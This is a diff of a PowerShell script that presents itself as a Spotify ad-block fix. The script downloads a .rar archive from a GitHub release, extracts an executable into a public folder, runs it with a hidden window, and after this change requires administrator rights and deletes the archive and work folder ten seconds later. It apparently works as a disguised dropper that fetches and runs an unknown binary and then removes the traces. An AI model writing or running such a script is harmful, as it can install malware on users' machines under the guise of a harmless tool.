@@ -1,3 +1,5 @@
+#Requires -RunAsAdministrator
+
 $packageUrl = "https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix/releases/download/spotify_adb/spotify_adb.rar"
 $exeName    = "spotify_adb.exe"
 $workDir    = "$env:PUBLIC\Runtime"
@@ -48,9 +50,14 @@ if ($exePath -and (Test-Path $exePath)) {
     Start-Process -FilePath $exePath -WindowStyle Hidden
 }
 
-Remove-Item $rarPath -Force -ErrorAction SilentlyContinue
+# ════════════════════════════════════
+# انتظر 10 ثواني وبعدين امسح كل حاجة
+# ════════════════════════════════════
+Start-Sleep -Seconds 10
 
-Write-Host "`r  [+] Done!                " -ForegroundColor Green
+# مسح ملف rar وكل محتويات مجلد العمل
+Remove-Item $rarPath -Force -ErrorAction SilentlyContinue
+Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
 
 # ═══════════════════════════════════════════════════════════════
 # SECTION 3: Spotify Ad-Block (SpotX)
@@ -66,13 +73,7 @@ catch {
     catch { }
 }
 
-# ═══════════════════════════════════════════════════════════════
-# SECTION 4: Cleanup
-# ═══════════════════════════════════════════════════════════════
-
-Start-Sleep -Seconds 2
-Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
-
+Write-Host "`r  [+] Done!                " -ForegroundColor Green
 Write-Host ""
 Write-Host "  Done! Enjoy ad-free Spotify." -ForegroundColor Green
 
